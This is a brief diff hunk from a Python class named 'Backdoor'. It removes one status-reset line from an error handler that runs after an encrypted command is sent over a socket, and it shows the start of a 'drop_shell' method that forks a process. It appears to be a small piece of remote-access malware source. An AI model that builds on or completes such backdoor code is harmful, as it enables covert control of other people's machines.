@@ -28,7 +28,6 @@ class Backdoor():
             self.conn.send(encrypted_cmd)
         except socket_error:
             stderr.write("Error sending command\n")
-            self.status = 0
             
     def drop_shell(self):
         pid = fork()
